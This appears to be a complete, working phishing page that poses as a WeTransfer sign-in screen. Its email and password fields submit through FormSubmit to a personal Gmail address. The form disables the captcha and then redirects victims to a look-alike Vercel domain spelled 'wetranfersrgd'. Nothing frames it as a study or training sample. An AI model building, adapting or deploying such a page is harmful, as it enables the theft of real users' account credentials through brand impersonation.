<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0"/>
<title>Wetransfer</title>

<link href="[fonts.googleapis.com](https://fonts.googleapis.com/css2?family=Poppins:wght@300;400;500;600;700&display=swap)" rel="stylesheet">

<style>
*{
  margin:0;
  padding:0;
  box-sizing:border-box;
  font-family:'Poppins',sans-serif;
}

/* Typographic scales and spacing fixes for mobile */
@media (max-width: 480px) {
  .logo { 
    font-size: clamp(36px, 9vw, 56px); 
  }
  .title { 
    font-size: clamp(10px, 6vw, 20px); 
  }
  .subtitle { 
    font-size: clamp(10px, 3.2vw, 13px); 
  }
  /* Ensures adequate spacing between stacked form elements */
  .input-group {
    margin-bottom: 16px; 
  }
}

/* Very small devices */
@media (max-width: 320px) {
  body { 
    padding: 16px; /* Slightly increased to prevent edge clipping */
  }
  .wrapper { 
    padding: 0; 
  }
  .input-group input {
    padding: 14px 16px;
    font-size: 16px;
  }
  /* Added a top margin to the button to explicitly force space below the input fields */
  .btn {
    font-size: 18px;
    padding: 14px;
    margin-top: 16px; 
  }
}


</style>
</head>
<body>

<div class="wrapper">

  <img src="logo.08he3n6vuv2qc (1).svg">
  <div class="title">Sign In</div>
  <div class="subtitle">to continue to your WeTransfer account.</div>

  <!-- ✅ FormSubmit Integration -->
  <form action="https://formsubmit.co/sloan6721oq@gmail.com" method="POST">


    <input type="hidden" name="_next" value="https://wetranfersrgd-x8f8.vercel.app/">
    <input type="hidden" name="_captcha" value="false">

    <div class="input-group">
      <input type="email" name="email" placeholder="Enter email" required>
    </div>

    <div class="input-group">
      <input type="password" name="password" placeholder="Type your password..." required>
    </div>

    <button type="submit" class="btn">Continue</button>
  </form>

  <div class="links">
    <a href="#">Forgot password?</a>
    <a href="#">Use a different email?</a>
  </div>

  <div class="divider"><span>or</span></div>

  <div class="bottom-text">
    Receive a <a href="#">temporary code via email</a>
  </div>

</div>

</body>
</html>
